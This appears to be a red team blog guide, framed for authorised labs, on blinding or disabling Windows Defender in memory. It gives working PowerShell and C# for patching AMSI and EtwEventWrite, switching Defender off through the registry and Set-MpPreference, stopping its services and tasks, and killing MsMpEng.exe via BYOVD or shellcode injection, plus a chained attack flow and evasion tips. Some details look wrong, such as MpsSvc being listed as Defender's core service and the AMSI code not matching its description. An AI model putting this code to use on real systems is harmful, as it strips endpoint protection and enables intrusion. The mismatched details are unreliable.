---
title: "Disabling Windows Defender Without Dropping Files to Disk"
date: 2026-03-06
description: "A practical red team guide covering five in-memory techniques to disable or blind Windows Defender without dropping files to disk."
tags: ["redteam", "evasion", "windows-defender", "amsi", "etw", "process-injection", "opsec"]
verified: "Windows 11 23H2 · Oct 2025"
tools: ["PowerShell", "C#", "PPLKiller"]
---

## Introduction

One of the first challenges on any Windows engagement is dealing with Windows Defender. Modern Defender is no longer the pushover it was five years ago. It integrates with AMSI, monitors ETW telemetry, and uses cloud-based ML models to catch both known and unknown threats.

The instinct for most beginners is to disable it by dropping a script or binary to disk. That approach is noisy, leaves artifacts, and gets caught. The better approach is to blind, patch, or kill Defender entirely from memory, leaving no trace on the file system.

This post covers five techniques to do exactly that:

1. PowerShell AMSI Bypass — patching the AMSI scan buffer in memory
2. ETW Patching — blinding Defender's telemetry pipeline
3. Registry-based Defender disable — modifying keys without touching disk
4. Task Scheduler and Service Tampering — disrupting Defender's operational components
5. Process Injection to kill Defender — terminating protected processes via injection

{{< callout type="warning" >}}
This post is intended for **authorized red team engagements and lab environments only**. Do not use these techniques against systems you do not own or have explicit written permission to test. All examples were tested in an isolated lab.
{{< /callout >}}

---

## Lab Setup

All techniques in this post were tested in an isolated lab. The following configuration is recommended before working through any section.

**Test machine:**
- Windows 10 22H2 or Windows 11 23H2 (x64), fully updated
- Windows Defender enabled with up-to-date definitions
- PowerShell 5.1 — behaviour differs on PowerShell 7, use the default 5.1 for all tests here

**Snapshot discipline:**
- Take a clean snapshot with Defender **enabled and fully updated** before testing each technique
- Revert between techniques: AMSI and ETW patches are per-session, but registry and service changes persist across reboots
- Suggested naming: `clean-defender-on`, `tamper-off-clean`, `post-amsi-patch`

**Tamper Protection:**
- Techniques 1 and 2 (AMSI, ETW patching) work regardless of Tamper Protection state
- Techniques 3 and 4 (registry, service tampering) require Tamper Protection to be **off**
- Disable it via: Windows Security → Virus & threat protection → Manage settings → Tamper Protection → Off
- Re-enable before reverting to a clean snapshot

**Monitoring (optional but recommended):**
- Install [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) with a standard config (SwiftOnSecurity or Olaf Hartong) to observe what telemetry each technique generates and what a blue team would see
- Event Viewer → Windows Logs → Security for service state changes (Event ID 7036) and PowerShell Script Block logging (Event ID 4104)

**Attacker machine:**
- Kali Linux or any Linux VM on a host-only or NAT network alongside the Windows VM
- `python3 -m http.server 8000` for payload delivery where needed

---

## Understanding the Threat Model

Before jumping into techniques, it helps to understand what you are actually trying to defeat. Windows Defender in a modern Windows 10/11 or Server 2019+ environment consists of several interlocking components:

| Component | Role | What Defeats It |
|---|---|---|
| AMSI | Scans PowerShell, VBScript, JScript at runtime | Memory patching |
| MpsSvc | Core Defender service | Service tampering, injection |
| ETW providers | Feeds telemetry to Defender | ETW patching |
| WdFilter.sys | Kernel-level file system filter | Requires kernel access |
| Cloud protection | ML-based cloud scanning | Network isolation or bypassing AMSI first |
| Tamper Protection | Prevents registry/service modification | Must be disabled via GUI or MEM first |

{{< callout type="info" >}}
**Tamper Protection** is the single biggest blocker for most of these techniques. If it is enabled, registry-based and service-based approaches will fail silently. Always check its status first and use injection or AMSI-based approaches when it is on.
{{< /callout >}}

Check Tamper Protection status from PowerShell:

```powershell
Get-MpComputerStatus | Select-Object IsTamperProtected, AMSIEnabled, RealTimeProtectionEnabled
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

## Technique 1 — PowerShell AMSI Bypass

### How AMSI Works

AMSI (Antimalware Scan Interface) hooks into the PowerShell runtime and passes every script block to the registered AV provider, in this case Defender, before execution. The key function is `AmsiScanBuffer` inside `amsi.dll`, which is loaded into every PowerShell process.

The bypass works by patching the `AmsiScanBuffer` function in memory to always return `AMSI_RESULT_CLEAN`, effectively telling PowerShell that everything it runs is clean.

### The Bypass

This is the classic in-memory patch. It uses reflection to locate `amsi.dll` in the current process and overwrites the first bytes of `AmsiScanBuffer` with a `ret` instruction. For all seven documented AMSI bypass techniques including context corruption, ETW suppression, and hardware breakpoints, see the full [AMSI Bypass Techniques](/docs/redteam/bypass-amsi) reference.

```powershell
$a = [Ref].Assembly.GetTypes() | ForEach-Object {
    if ($_.Name -like "*iUtils*") { $_ }
}
$b = $a.GetFields('NonPublic,Static') | ForEach-Object {
    if ($_.Name -like "*Context*") { $_ }
}
$c = $b.GetValue($null)
[IntPtr]$ptr = $c
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57,[UInt32]0x00,[UInt32]0x07,[UInt32]0x80,[UInt32]0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 6)
```

This patches `amsi.dll` in the current PowerShell process memory. After running this, any subsequent PowerShell commands in the same session bypass AMSI entirely.

### Verify the Bypass Worked

```powershell
# This string is flagged by AMSI by default
# If AMSI is patched it will not trigger a block
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

### OPSEC Notes

- This patch only applies to the **current PowerShell process**. Each new session needs to be patched again
- The string patterns in the bypass itself may be flagged by AMSI before the patch completes: obfuscate variable names and string literals
- Avoid copy-pasting known public bypass strings. Defender signatures cover most popular ones

---

## Technique 2 — ETW Patching

### How ETW Feeds Defender

Event Tracing for Windows (ETW) is a kernel-level logging infrastructure. The `Microsoft-Windows-PowerShell` ETW provider sends real-time telemetry about script block execution directly to Defender. Even if AMSI is bypassed, ETW can still catch malicious activity by logging what PowerShell is executing.

Patching ETW in the current process stops this telemetry from being sent, effectively blinding Defender to what is running in that session.

### The Patch

The target is `EtwEventWrite` inside `ntdll.dll`. Patching it with a `ret` instruction causes all ETW write calls in the current process to silently return without sending any data:

```powershell {linenos=inline}
function Invoke-ETWPatch {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class ETWPatch {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@
    $ntdll   = [ETWPatch]::GetModuleHandle("ntdll.dll")
    $etwAddr = [ETWPatch]::GetProcAddress($ntdll, "EtwEventWrite")

    $oldProtect = 0
    [ETWPatch]::VirtualProtect($etwAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null

    $written = 0
    [ETWPatch]::WriteProcessMemory(
        [ETWPatch]::GetCurrentProcess(), $etwAddr, [byte[]](0xC3), 1, [ref]$written
    ) | Out-Null

    [ETWPatch]::VirtualProtect($etwAddr, [UIntPtr]::new(1), $oldProtect, [ref]$oldProtect) | Out-Null
    Write-Host "[+] EtwEventWrite patched at 0x$($etwAddr.ToString('X')) — ETW blinded in current process"
}

Invoke-ETWPatch
```

{{< callout type="warning" >}}
**Session collision:** This block compiles a class named `ETWPatch` via `Add-Type`. If you have already run the AMSI bypass ETW patch from the [AMSI Bypass Techniques](/docs/redteam/bypass-amsi) page (which defines a class named `NAPI`), both will work independently. However, if you run this block a second time in the same PowerShell session, `Add-Type` will throw a type-already-defined error because compiled types persist for the session lifetime. Start a fresh session or rename the class if you need to re-run it.
{{< /callout >}}

{{< callout type="info" >}}
`GetProcAddress` resolves `EtwEventWrite` by name at runtime, with no hardcoded offsets, working across all Windows builds. `VirtualProtect` with `0x40` (PAGE_EXECUTE_READWRITE) makes the memory writable before the patch, then restores the original protection afterward to avoid leaving an anomalous RWX page.
{{< /callout >}}

The equivalent C# approach used in implants follows the same pattern:

```csharp
// C# equivalent used in implants
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
VirtualProtect(etwAddr, 1, 0x40, out _);
Marshal.WriteByte(etwAddr, 0xC3); // ret
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

### OPSEC Notes

- Like AMSI patching, this is **per-process**. It only blinds ETW in the current session
- Kernel ETW providers are unaffected. This only patches user-mode telemetry
- Combined with AMSI patching, this covers the two main visibility channels Defender has into PowerShell execution

---

## Technique 3 — Registry-Based Defender Disable

### The Approach

When Tamper Protection is **disabled**, Windows Defender's behaviour can be controlled entirely through registry keys. The relevant keys live under:

```
HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender
```

These policy keys override user-level settings and are typically used by enterprise GPO, but they work just as well when set manually.

### Disabling Real-Time Protection

```powershell {linenos=inline}
# Check Tamper Protection first
$status = Get-MpComputerStatus
if ($status.IsTamperProtected) {
    Write-Host "Tamper Protection is ON - registry method will fail"
} else {
    # Disable real-time monitoring
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
        -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" `
        -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force

    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" `
        -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force

    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" `
        -Name "DisableIOAVProtection" -Value 1 -Type DWord -Force
}
```

### Disabling via MpPreference (no disk touch)

```powershell {linenos=inline}
# These run entirely in memory via the Defender management API
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

### OPSEC Notes

- Requires **local administrator** privileges minimum
- Requires **Tamper Protection to be off**. This is the most common failure point
- Registry changes persist across reboots. Clean up after the engagement
- In domain environments, GPO may re-apply Defender settings on next policy refresh. Check `gpresult /r` to understand the policy landscape

---

## Technique 4 — Task Scheduler and Service Tampering

### Disrupting Defender via Services

Windows Defender runs as several interdependent services. Stopping or disabling the right ones cascades into full protection loss:

| Service Name | Display Name | Role |
|---|---|---|
| WinDefend | Windows Defender Antivirus Service | Core scanning engine |
| WdNisSvc | Network Inspection Service | Network-based threat detection |
| WdNisDrv | Network Inspection Driver | Kernel network driver |
| Sense | Windows Defender Advanced Threat Protection | EDR/ATP component |

```powershell {linenos=inline}
# Stop and disable core Defender services
$services = @("WinDefend", "WdNisSvc", "Sense")

foreach ($svc in $services) {
    try {
        Stop-Service -Name $svc -Force -ErrorAction Stop
        Set-Service -Name $svc -StartupType Disabled
        Write-Host "[+] Disabled: $svc"
    } catch {
        Write-Host "[-] Failed: $svc - $_"
    }
}
```

{{< callout type="warning" >}}
Stopping `WinDefend` directly is blocked by Tamper Protection and Protected Process Light (PPL). If the service is PPL-protected, use the process injection technique in the next section instead.
{{< /callout >}}

### Disrupting Scheduled Tasks

Defender uses scheduled tasks for definition updates and periodic scans. Disabling these degrades its effectiveness over time:

```powershell
# List all Defender scheduled tasks
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" | 
    Select-Object TaskName, State

# Disable all Defender scheduled tasks
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" | 
    Disable-ScheduledTask
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

### OPSEC Notes

- Disabling services and tasks requires **local administrator** and is blocked by **Tamper Protection**
- These changes are highly visible in logs: Event ID 7036 (service state change) will fire for each service stopped
- Better used as a cleanup step after gaining SYSTEM rather than an initial bypass

---

## Technique 5 — Process Injection to Kill Defender

### The Problem with PPL

Modern Windows Defender runs as a **Protected Process Light (PPL)**. This means even a local administrator cannot terminate, inject into, or modify the `MsMpEng.exe` process through normal Win32 API calls. `TerminateProcess` will return `Access Denied`.

To kill a PPL process you need either:
- A kernel driver with appropriate privileges
- A technique that abuses a trusted PPL process to do the work for you
- The `PPLdump` or `PPLKiller` approach using vulnerable signed drivers (BYOVD)

### BYOVD — Bring Your Own Vulnerable Driver

The most reliable technique in red team engagements is BYOVD: loading a legitimately signed but vulnerable kernel driver and using it to kill PPL processes:

```powershell
# Using PPLKiller (requires a vulnerable driver)
# This loads the driver and uses it to strip PPL from MsMpEng.exe

# Step 1 — Load the vulnerable driver (in memory via reflection, not dropped to disk)
# Step 2 — Use the driver's IOCTL interface to remove PPL protection from MsMpEng.exe
# Step 3 — Terminate MsMpEng.exe via standard TerminateProcess

# Example using the RTCore64 vulnerable driver technique
$driverPath = "\\.\RTCore64"  # Access after loading the driver
```

### Alternative — Shellcode Injection via Sacrificial Process

If BYOVD is not available, an alternative is to inject shellcode into a sacrificial process that already has sufficient privileges, and use that process to interact with Defender's process space:

```csharp
// Pseudocode — inject into a high-privilege process
// then use NtQuerySystemInformation to enumerate protected processes
// and NtTerminateProcess via the injected context

IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length, 
    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, allocMem, shellcode, shellcode.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, out _);
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

### OPSEC Notes

- BYOVD is very effective but the vulnerable driver itself may be flagged by Defender. Load it from memory, not disk
- Process injection generates Sysmon Event ID 8 (CreateRemoteThread). Expect detection if a blue team is watching
- This technique is best reserved for engagements where stealth is less critical than full Defender removal

---

## Chaining the Techniques — A Practical Attack Flow

In a real engagement these techniques are rarely used in isolation. Here is a practical flow for a standard Windows target:

``` {linenos=inline}
1. Land on target — initial shell via phishing, exploit, or password spray

2. Check Tamper Protection status
   └── Get-MpComputerStatus | Select IsTamperProtected

3. If Tamper Protection OFF:
   └── Registry disable via Set-MpPreference (cleanest, no disk touch)
   └── Disable scheduled tasks for persistence degradation

4. If Tamper Protection ON:
   └── AMSI patch first (needed to run further PowerShell safely)
   └── ETW patch (blind telemetry in current session)
   └── Escalate to SYSTEM
   └── Use BYOVD or PPLKiller to strip/kill MsMpEng.exe
   └── Then apply registry disable once PPL is gone

5. Verify Defender is fully disabled
   └── Get-MpComputerStatus
   └── Test with a known-bad string or EICAR string in memory
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

## Verification — Confirming Defender is Blind

After applying your chosen technique, verify the state:

```powershell {linenos=inline}
# Full status check
Get-MpComputerStatus | Select-Object `
    AMSIEnabled, `
    RealTimeProtectionEnabled, `
    IsTamperProtected, `
    AntivirusEnabled, `
    BehaviorMonitorEnabled, `
    IoavProtectionEnabled, `
    NISEnabled

# Check service states
Get-Service WinDefend, WdNisSvc | Select-Object Name, Status, StartType
```

All protection fields should return `False` or services should show `Stopped` if the bypass was successful.

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

## Cleanup

Always clean up after an engagement. Leaving Defender disabled on a client system is an engagement failure from an OPSEC standpoint:

```powershell {linenos=inline}
# Re-enable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false

# Re-enable scheduled tasks
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" | 
    Enable-ScheduledTask

# Remove registry keys if set
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
    -Name "DisableAntiSpyware" -ErrorAction SilentlyContinue

# Re-enable services
Set-Service -Name WinDefend -StartupType Automatic
Start-Service -Name WinDefend
```

---

## Key Takeaways

- **Check Tamper Protection first** — it is the single biggest blocker and determines which techniques are viable
- **AMSI + ETW patching** is your minimum viable bypass for any PowerShell-heavy engagement — do this first, every time
- **Registry disable** is the cleanest full-disable when Tamper Protection is off — no disk artifacts, reversible
- **BYOVD** is the most powerful technique for PPL-protected processes but carries the highest detection risk
- **Never leave Defender disabled** after an engagement — clean up every change you make

---

## References

- [AMSI Documentation — Microsoft](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [MITRE ATT&CK T1562.001 — Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
- [PPLdump — GitHub](https://github.com/itm4n/PPLdump)
- [ETW Patching Research — modexp](https://modexp.wordpress.com/2020/04/08/reflective-load-library/)
